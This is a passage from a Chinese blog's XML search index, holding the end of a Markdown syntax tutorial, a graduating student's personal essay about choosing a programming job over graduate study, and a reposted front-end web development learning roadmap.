自定义语法该方法可以根据不同的语言配置不同的代码着色。(代码在使用的时候去掉前面的反斜杠，这里为了防止被编译而加上) 123456\```javascriptvar num = 0;for (var i = 0; i &lt; 5; i++) &#123; num+=i;&#125;\```console.log(num); 效果： 12345var num = 0;for (var i = 0; i &lt; 5; i++) &#123; num+=i;&#125;console.log(num); 列表Markdown中支持两种列表：无序列表和有序列表。 无序列表无序列表有三种语法,可使用 * 、+ 、 -作为列表标记。代码： 123* Red* Green* Blue 或 123+ Red+ Green+ Blue 或 123- Red- Green- Blue 效果： Red Green Blue 有序列表在列表标记上使用的数字并不会影响输出的 HTML 结果，即可以让 Markdown 文件的列表数字和输出的结果相同，也可以完全不用在意数字的正确性。代码： 1231. Bird2. McHale3. Parish 效果： Bird McHale Parish 分割线可以在一行中用三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。你也可以在星号或是减号中间插入空格。代码： 123456789* * *********- - ---------------------------------------- 效果： 链接Markdown 支持两种形式的链接语法： 行内式和参考式两种形式。不管是哪一种，链接文字都是用 [方括号] 来标记。 行内式要建立一个行内式的链接，只要在方块括号后面紧接着圆括号并插入网址链接即可，如果你还想要加上链接的 title 文字，只要在网址后面，用双引号把 title 文字包起来即可。代码： 1[an example](http://example.com/&quot;Title&quot;)&#123;: 效果：an example 参考式该链接必须带 http:// ，否则会被解析成本地路径，代码： 12[an example][id][id]: http://example.com/ 效果：an example 图片Markdown 使用一种和链接很相似的语法来标记图片，和链接的主要区别在于在最开头需要标记 ! 。同样分为行内式和参考式。 行内式方括号中用来放图片无法正常显示时的替代文字，代码： 1![Alt text](../assets/blogImg/avatar.png) 参考式代码： 12![Alt text][01][01]: ../assets/blogImg/avatar.png 效果： 任务列表注意要空开一行书写。代码： 123- [x] 选项一- [ ] 选项二 - [ ] [选项3] 效果： 选项一 选项二 选项三 表格: 代表对齐方式 , : 与 | 之间不要有空格，否则对齐会有些不兼容。代码： 1234| a | b | c ||:-------:|:------------- | ----------:|| 居中 | 左对齐 | 右对齐 ||=========|===============|============| 效果： a b c 居中 左对齐 右对齐 ========= =============== ============ 简约写法： 1234a | b | c :-:|:- |-: 居中 | 左对齐 | 右对齐 ============|=================|============= 字体 描述 效果 代码 斜体 斜体 *斜体* 斜体 斜体 _斜体_ 加粗 加粗 **加粗** 加粗+斜体 加粗+斜体 ***加粗+斜体*** 加粗+斜体 加粗+斜体 **_加粗+斜体_** 删除线 删除线 ~~删除线~~]]></content>
      <categories>
        <category>语法</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[人生这本书翻开新的一章]]></title>
    <url>%2F%E4%BA%BA%E7%94%9F%E8%BF%99%E6%9C%AC%E4%B9%A6%E7%BF%BB%E5%BC%80%E6%96%B0%E7%9A%84%E4%B8%80%E7%AB%A0.html</url>
    <content type="text"><![CDATA[3月的尾巴，距离大学毕业还剩2个月左右的时间，昨晚和室友卧谈，聊起了在这个时间点，每个站在人生岔路口迷茫的我们。最近考研、考公的都出了结果，漫长的备考过程，本期望着盼来好消息的两个室友却不得不面对与自己第一志愿失之交臂，在调剂亦或是就业中做出选择，当其他得到录取通知的同学开始整日整日放纵欢腾的时候，她们脸上是淡淡的笑，眼里却也有着对未来的迷茫。在和我一起逛过几次招聘会后，昨天其中一个室友说，她决定调剂，去一个离我们很远的地方继续她的学习生涯，说这话时，我能感觉到她隐隐的无奈，但也只能淡淡祝她好运，话题的最后，我仿佛听到自己内心一个声音问道：“这就是你当初不选择考研而是直接工作的原因吗？”不是。去年的这个时候，当我做出这个决定周围经常会有人问“你成绩那么好，大学那么努力，为什么不考虑考研深造呢”，我不考研并不是因为我害怕最后会失败，而是我清楚的知道自己想要什么，即使学生时代那么让人留恋，但明确知道自己想做一名优秀程序媛的我，需要更多的是实践动手能力，在公司中不断参与项目的开发能更快提升我的能力，虽然一个更高的学历可能会为我在就业上扫除很多障碍，就不会像现在的我这样有些无助。不愿离开学生时代，倒不如说是不愿离开象牙塔。但是不管是哪一个选择都已经是过去式，与其缅怀过去不如立足当下。现在的不顺利，是之前的准备不充分，机会是给有准备的人的这句话，不是失败者拿来自我安慰，所幸学习这件事，不管何时开始都不算晚，为了让自己更优秀，让自己成为HR眼中合适的人，让自己离自己的目标越来越接近，就从这篇博文开始，找回那个热血的自己。嘴上立志轻松容易，但学习却是持之以恒，愿自己初心莫负。 ——2018年3月30日于杭州师范大学]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>随笔</tag>
        <tag>心情</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端学习路线]]></title>
    <url>%2F%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF.html</url>
    <content type="text"><![CDATA[第一阶段： HTML+CSS：HTML进阶、CSS进阶、div+css布局、HTML+css整站开发。 JavaScript基础：Js基础教程、js内置对象常用方法、常见DOM树操作大全、ECMAscript、DOM、BOM、定时器和焦点图。 JS基本特效：常见特效、例如：tab、导航、整页滚动、轮播图、JS制作幻灯片、弹出层、手风琴菜单、瀑布流布局、滚动事件、滚差视图。 JS高级特征：正则表达式、排序算法、递归算法、闭包、函数节流、作用域链、基于距离运动框架、面向对象基础。 JQuery：悬着器、DOM操作、特效和动画、方法链、拖拽、变形、JQueryUI组件基本使用。 第二阶段：HTML5和移动Web开发 HTML5：HTML5新语义标签、HTML5表单、音频和视频、离线和本地存储、SVG、Web Socket、Canvas。 CSS3：CSS3新选择器、伪元素、脸色表示法、边框、阴影、background系列属性改变、Transition、动画、景深和深透、3D效果制作、Velocity.js框架、元素进场、出场策略、炫酷CSS3网页制作。 Bootstrap:响应式概念、媒体查询、响应式网站制作、删格系统、删格系统原理、Bootstrap常用模板、LESS和SASS。 移动Web开发：跨终端WEB和主流设备简介、视口、流式布局、弹性盒子、rem、移动终端JavaScript事件、手机中常见JS效果制作、Zepto.js、手机聚划算页面、手机滚屏。 第三阶段：HTTP服务和AJAX编程 WEB服务器基础：服务器基础知识、Apache服务器和其他WEB服务器介绍、Apache服务器搭建、HTTP介绍。 PHP基础：PHP基础语法、使用PHP处理简单的GET或者POST请求。 AJAX上篇：Ajax简介和异步的概念、Ajax框架的封装、XMLHttpRequest对象详细介绍方法、兼容性处理方法、Ajax框架的封装、Ajax中缓存问题、XML介绍和使用。 AJAX下篇：JSON和JSON解析、数据绑定和模板技术、JSONP、跨域技术、图片预读取和lazy-load技术、JQuery框架中的AjaxAPI、使用Ajax实现爆布流案例额。 第四阶段：HTTP服务和AJAX编程 面向对象终极篇：从内存角度到理解JS面向对象、基本类型、复杂类型、原型链、ES6中的面向对象、属性读写权限、设置器、访问器。 面向对象三大特征：继承性、多态性、封装性、接口。 设计模式：面向对象编程思维、单例模式、工厂模式、策略模式、观察者模式、模板方法模式、代理模式、装饰者模式、适配器模式、面向切面编程。 第五阶段：封装一个属于自己的框架 框架封装基础：事件流、冒泡、捕获、事件对象、事件框架、选择框架。 框架封装中级：运动原理、单物体运动框架、多物体运动框架、运动框架面向对象封装。 框架封装高级和补充：JQuery框架雏形、可扩展性、模块化、封装属于传智自己的框架。 第六阶段：模块化组件开发 面向组件编程：面向组件编程的方式、面向组件编程的实现原理、面向组件编程实战、基于组件化思想开发网站应用程序。 面向模块编程：AMD设计规范、CMD设计规范、RequireJS，LoadJS、淘宝的SeaJS。 第七阶段：主流的流行框架 Web开发工作流：GIT/SVN、Yeoman脚手架、NPM/Bower依赖管理工具、Grunt/Gulp/Webpack。 MVC/MVVM/MVW框架：Angular.js、Backbone.js、Knockout/Ember。 常用库：React.js、Vue.js、Zepto.js。 第八阶段：HTML5原生移动应用开发 Cordova：WebApp/NativeApp/HybirdApp简介、Cordova简介、与PhoneGap之间的关系、开发环境搭建、Cordova实战（创建项目，配置，编译，调试，部署发布）。 Ionic：Ionic简介和同类对比、模板项目解析、常见组件及使用、结合Angular构建APP、常见效果（下拉刷新，上拉加载，侧滑导航，选项卡）。 React Native：React Native简介、React Native环境配置、创建项目，配置，编译，调试，部署发布、原生模块和UI组件、原生常用API。 HTML5+：HTML5+中国产业联盟、HTML5 Plus Runtime环境、HBuilder开发工具、MUI框架、H5+开发和部署。 第九阶段：Node.js全栈开发 快速入门：Node.js发展、生态圈、Io.js、Linux/Windows/OS X环境配置、REPL环境和控制台程序、异步编程，非阻塞I/O、模块概念，模块管理工具、开发流程，调试，测试。 核心模块和对象：全局对象global，process，console，util、事件驱动，事件发射器、加密解密，路径操作，序列化和反序列化、文件流操作、HTTP服务端与客户端、Socket.IO。 Web开发基础：HTTP协议，请求响应处理过程、关系型数据库操作和数据访问、非关系型数据库操作和数据访问、原生的Node.js开发Web应用程序、Web开发工作流、Node.js开发Blog案例。 快速开发框架：Express简介+MVC简介、Express常用API、Express路由模块、Jade/Ejs模板引擎、使用Express重构Blog案例、Koa等其他常见MVC框架。 Node.js开发电子商务实战：需求与设计、账户模块注册登录、会员中心模块、前台展示模块、购物车，订单结算、在线客服即时通讯模块。 转自:https://blog.csdn.net/u011047006/article/details/52597178]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
</search>
